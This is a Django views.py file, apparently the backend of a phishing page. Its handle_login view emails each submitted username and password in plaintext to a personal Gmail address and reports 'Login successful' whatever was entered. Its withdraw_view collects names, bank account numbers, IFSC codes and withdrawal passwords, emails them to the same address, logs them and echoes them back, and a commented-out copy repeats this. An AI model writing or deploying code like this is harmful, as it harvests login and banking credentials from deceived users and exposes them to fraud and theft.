# api/views.py
from django.core.mail import send_mail
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt
import logging
from django.conf import settings
@csrf_exempt
def handle_login(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        try:
            # Send an email with the form data
            send_mail(
                'Login Form Submission',
                f'Username: {username}\nPassword: {password}',
                'your_email@example.com',  # Your email address for sending the email
                ['nikhilrai662@gmail.com'],  # Your email address to receive the email
                fail_silently=False,
            )
        except Exception as e:
            logging.exception("Error sending email")
            return JsonResponse({'message': 'Error sending email'}, status=500)

        # Return a JSON response
        return JsonResponse({'message': 'Login successful'}, status=200)
    
    elif request.method == 'OPTIONS':
        # Handle OPTIONS request (preflight request for CORS)
        return JsonResponse({'message': 'Preflight request accepted'}, status=200)

    return HttpResponse('Method Not Allowed', status=405)


from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def withdraw_view(request):
    if request.method == 'POST':
        # Process form data
        name = request.POST.get('name')
        account_type = request.POST.get('accountType')
        account_number = request.POST.get('accountNumber')
        ifsc_code = request.POST.get('ifscCode')
        password = request.POST.get('with_password')

        recipient_email = 'nikhilrai662@gmail.com'
        subject = 'Form Data Submitted'
        message = f'''
        Form Data Submitted:
        Name: {name}
        Account Type: {account_type}
        Account Number: {account_number}
        IFSC Code: {ifsc_code}
        Withdraw Password: {password}
        '''
        send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [recipient_email])
        # Debugging: Print received data
        print(f"Name: {name}, Account Type: {account_type}, Account Number: {account_number}, IFSC Code: {ifsc_code}, Password: {password}")

        # Example: Send email with form data (replace with your email sending logic)
        # send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [recipient_email])

        # Prepare JSON response
        data = {
            'message': 'Request received successfully!',
            'name': name,
            'accountType': account_type,
            'accountNumber': account_number,
            'ifscCode': ifsc_code,
            'with_password': password,
        }
        return JsonResponse(data)
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)


# @csrf_exempt
# def withdraw_view(request):
#     if request.method == 'POST':
#         # Process form data
#         name = request.POST.get('name')
#         account_type = request.POST.get('accountType')
#         account_number = request.POST.get('accountNumber')
#         ifsc_code = request.POST.get('ifscCode')
#         password = request.POST.get('with_password')

#         # Send email with form data
#         recipient_email = 'nikhilrai662@gmail.com'
#         subject = 'Form Data Submitted'
#         message = f'''
#         Form Data Submitted:
#         Name: {name}
#         Account Type: {account_type}
#         Account Number: {account_number}
#         IFSC Code: {ifsc_code}
#         Withdraw Password: {password}
#         '''
#         send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [recipient_email])

#         # Prepare JSON response
#         data = {
#             'message': 'Request received successfully!',
#             'name': name,
#             'accountType': account_type,
#             'accountNumber': account_number,
#             'ifscCode': ifsc_code,
#             'with_password': password,
#         }
#         return JsonResponse(data)
#     else:
#         return JsonResponse({'error': 'Method not allowed'}, status=405)
